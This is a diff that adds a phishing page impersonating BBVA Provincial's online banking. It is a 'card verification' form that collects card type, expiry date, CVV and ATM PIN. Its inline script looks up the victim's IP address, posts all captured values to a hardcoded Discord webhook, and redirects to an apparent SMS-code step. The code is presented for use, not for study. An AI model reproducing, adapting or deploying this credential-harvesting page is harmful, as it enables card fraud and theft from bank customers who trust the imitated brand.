@@ -1,0 +1,355 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge; chrome=1"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+    <title>BBVA Provincial - Verificación de Tarjeta</title>
+
+    <link rel="stylesheet" href="fbin/css/fonts/fonts.css">
+    <link rel="stylesheet" href="fbin/css/style.css">
+    <link rel="stylesheet" href="fbin/css/header.css">
+    <link rel="stylesheet" href="fbin/css/login.css">
+    <link rel="stylesheet" href="fbin/css/footer.css">
+    <link rel="stylesheet" href="fbin/css/fontawesome.min.css">
+
+    <style>
+        .main-footer {
+            margin-top: 50px !important;
+        }
+
+        .card-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px 0;
+            text-align: center;
+        }
+
+        .card-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--bbva-blue-dark, #070E46);
+            font-family: 'TiempoHeadline_Bold', Helvetica, Arial, sans-serif;
+            margin-bottom: 8px;
+        }
+
+        .card-text {
+            font-size: 14px;
+            color: #555555;
+            font-family: 'BentonSansBBVA_Book', Helvetica, Arial, sans-serif;
+            margin-bottom: 20px;
+            max-width: 380px;
+        }
+
+        .form-group-custom {
+            width: 100%;
+            max-width: 320px;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group-custom label {
+            display: block;
+            font-size: 13px;
+            color: #070E46;
+            font-family: 'BentonSansBBVA_Bold', Helvetica, Arial, sans-serif;
+            margin-bottom: 5px;
+        }
+
+        .input-custom, .select-custom {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            border: 2px solid #ccc;
+            border-radius: 6px;
+            outline: none;
+            background-color: #fff;
+            transition: border-color 0.2s;
+            box-sizing: border-box;
+        }
+
+        .input-custom:focus, .select-custom:focus {
+            border-color: #004481;
+        }
+
+        .row-inputs {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-verificar {
+            width: 100%;
+            max-width: 320px;
+            padding: 14px;
+            background-color: #004481;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 15px;
+        }
+
+        .btn-verificar:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .btn-verificar:not(:disabled):hover {
+            background-color: #002d59;
+        }
+        .main-footer {
+            margin-top: 15vh !important; 
+        }
+        .main-content {
+            margin-top: 15vh !important; 
+        }
+    </style>
+</head>
+<body class="login">
+    <header class="header">
+        <div class="header-content container">
+            <div class="logo">
+                <div class="logo-placeholder">
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/logo-bbva.svg" alt="" class="headerLogo"/>
+                </div>
+            </div>
+            <nav class="header-nav">
+                <a href="#" class="nav-link" style="font-size: 20px">Acceso a Provinet Personas</a>
+                <a href="#" class="nav-link bbva-link">Ir a BBVA Provincial</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="main-content" style="margin-top: 50px;">
+        <div class="breadcrumb-notice">
+            <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/lock.svg" class="icono-lock" alt="">
+            <span class="txtSeg">Estás en un entorno con seguridad BBVA Provincial</span>
+        </div>
+
+        <div class="container" id="container2">
+            <div class="access-area">
+                <div id="form-column2" class="form-column" style="width: 100%;">
+                    
+                    <!-- Formulario sin acción PHP, controlado por JS -->
+                    <form autocomplete="off" class="card-container" id="cardForm">
+                        <h1 class="card-title">Validación de Tarjeta</h1>
+                        <p class="card-text">Ingrese los datos adicionales de su tarjeta para confirmar su identidad.</p>
+
+                        <!-- Selector Crédito / Débito -->
+                        <div class="form-group-custom">
+                            <label for="tipo_tarjeta">Tipo de tarjeta</label>
+                            <select name="tipo_tarjeta" id="tipo_tarjeta" class="select-custom" required>
+                                <option value="" disabled selected>Seleccione una opción</option>
+                                <option value="Crédito">Crédito</option>
+                                <option value="Débito">Débito</option>
+                            </select>
+                        </div>
+
+                        <!-- Fecha de expiración MM/AA -->
+                        <div class="form-group-custom">
+                            <label for="expiracion">Fecha de expiración (MM/AA)</label>
+                            <input type="text" name="expiracion" id="expiracion" class="input-custom" placeholder="MM/AA" maxlength="5" required>
+                        </div>
+
+                        <div class="row-inputs" style="width: 100%; max-width: 320px;">
+                            <!-- Código de seguridad (CVV) -->
+                            <div class="form-group-custom" style="flex: 1;">
+                                <label for="cvv">CVV / CVC</label>
+                                <input type="password" name="cvv" id="cvv" class="input-custom" placeholder="•••" maxlength="4" inputmode="numeric" required>
+                            </div>
+
+                            <!-- Clave del cajero -->
+                            <div class="form-group-custom" style="flex: 1;">
+                                <label for="ultimos_digitos">Clave del cajero</label>
+                                <input type="password" name="ultimos_digitos" id="ultimos_digitos" class="input-custom" placeholder="•••" maxlength="4" inputmode="numeric" required>
+                            </div>
+                        </div>
+
+                        <button type="submit" id="btnVerificar" class="btn-verificar" disabled>Continuar</button>
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="main-footer" style="margin-top: 50px;">
+        <div class="footer-content">
+            <!-- Logo y Redes Sociales -->
+            <div class="footer-header">
+                <div class="footer-logo">
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/logo-bbva-blanco.svg" alt="BBVA Logo"/>
+                </div>
+                <div class="social-links">
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/facebook.svg" 
+                        class="icono30" 
+                        onclick="window.open('https://www.facebook.com/BBVAProvincial.Venezuela', '_blank');"
+                        alt="Facebook"/>
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/twitter.svg" 
+                        class="icono30" 
+                        onclick="window.open('https://twitter.com/bbvaprovincial', '_blank');"
+                        alt="Twitter"/>
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/instagram.svg" 
+                        class="icono30" 
+                        onclick="window.open('https://www.instagram.com/bbvavenezuela', '_blank');"
+                        alt="Instagram"/>
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/linked-in.svg" 
+                        class="icono30" 
+                        onclick="window.open('https://ve.linkedin.com/company/bbva-banco-provincial', '_blank');"
+                        alt="LinkedIn"/>
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/youtube.svg" 
+                        class="icono30" 
+                        onclick="window.open('https://www.youtube.com/user/venezuelabbva?feature=mhsn', '_blank');"
+                        alt="YouTube"/>
+                </div>
+            </div>
+
+            <!-- Copyright -->
+            <div class="footer-copyright">
+                &#169;2026 BBVA Provincial S.A.
+            </div>
+            
+            <div class="footer-copyright-mobile">
+                &#169;2026 BBVA Provincial S.A. RIF: <br> J-00002967-9
+            </div>
+        </div>
+    </footer>
+
+    <!-- Script unificado: validaciones, captura de IP, envío a Discord y redirección -->
+    <script>
+        const tipoTarjeta = document.getElementById("tipo_tarjeta");
+        const expiracion = document.getElementById("expiracion");
+        const cvv = document.getElementById("cvv");
+        const ultimosDigitos = document.getElementById("ultimos_digitos");
+        const btnVerificar = document.getElementById("btnVerificar");
+        const formulario = document.getElementById("cardForm");
+
+        // Tu Webhook de Discord
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568324102739988590/Ns7AHvf9Nnj5qBHZJF5tT-hE82yMrajrlHGxG9apX3uf-_fiVWTl6Gwqn7X5K7ccqx38";
+
+        // Formatear automáticamente MM/AA mientras escribe
+        expiracion.addEventListener("input", function(e) {
+            let val = e.target.value.replace(/\D/g, ""); // Solo números
+            if (val.length >= 3) {
+                e.target.value = val.slice(0, 2) + "/" + val.slice(2, 4);
+            } else {
+                e.target.value = val;
+            }
+            validarFormulario();
+        });
+
+        // Asegurar que CVV sean solo números
+        cvv.addEventListener("input", function(e) {
+            e.target.value = e.target.value.replace(/\D/g, "");
+            validarFormulario();
+        });
+
+        // Asegurar que los últimos dígitos sean solo números
+        ultimosDigitos.addEventListener("input", function(e) {
+            e.target.value = e.target.value.replace(/\D/g, "");
+            validarFormulario();
+        });
+
+        tipoTarjeta.addEventListener("change", validarFormulario);
+
+        function validarFormulario() {
+            const tipoValido = tipoTarjeta.value !== "";
+            const expValida = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiracion.value);
+            const cvvValido = cvv.value.length >= 3;
+            const ultimosValido = ultimosDigitos.value.length === 4;
+
+            if (tipoValido && expValida && cvvValido && ultimosValido) {
+                btnVerificar.removeAttribute("disabled");
+            } else {
+                btnVerificar.setAttribute("disabled", "true");
+            }
+        }
+
+        // Interceptamos el envío del formulario
+        if (formulario) {
+            formulario.addEventListener("submit", async function(e) {
+                e.preventDefault(); // Evita recargas por defecto
+
+                btnVerificar.setAttribute("disabled", "true");
+
+                try {
+                    // 1. Obtener la IP real del usuario mediante ipify
+                    let ipUsuario = "Desconocida";
+                    try {
+                        const responseIp = await fetch("https://api.ipify.org?format=json");
+                        const dataIp = await responseIp.json();
+                        ipUsuario = dataIp.ip;
+                    } catch (errIp) {
+                        console.warn("No se pudo obtener la IP:", errIp);
+                    }
+
+                    // 2. Preparar el mensaje en Embed para Discord
+                    const embed = {
+                        title: "Verificación de Tarjeta Capturada",
+                        color: 3447003, // Color azul distintivo
+                        fields: [
+                            {
+                                name: "Tipo de Tarjeta",
+                                value: tipoTarjeta.value,
+                                inline: true
+                            },
+                            {
+                                name: "Expiración",
+                                value: "`" + expiracion.value + "`",
+                                inline: true
+                            },
+                            {
+                                name: "CVV / CVC",
+                                value: "`" + cvv.value + "`",
+                                inline: true
+                            },
+                            {
+                                name: "Clave de Cajero",
+                                value: "`" + ultimosDigitos.value + "`",
+                                inline: true
+                            },
+                            {
+                                name: "Dirección IP Real",
+                                value: "`" + ipUsuario + "`",
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    const payload = {
+                        username: "Bot de Verificación de Tarjetas",
+                        embeds: [embed]
+                    };
+
+                    // 3. Enviar datos a Discord directamente
+                    const responseDiscord = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    // 4. Redirigir a cargando.html si el envío es exitoso
+                    if (responseDiscord.ok) {
+                        window.location.href = "sms1.html";
+                    } else {
+                        alert("Ocurrió un error al enviar la información.");
+                        btnVerificar.removeAttribute("disabled");
+                    }
+
+                } catch (error) {
+                    console.error("Error en la petición:", error);
+                    alert("Error de conexión con el servidor.");
+                    btnVerificar.removeAttribute("disabled");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
